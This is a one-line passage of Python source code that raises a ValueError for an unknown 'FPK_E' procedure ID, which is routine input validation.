    raise ValueError(f"Unknown FPK_E procedure: {proc_id}")
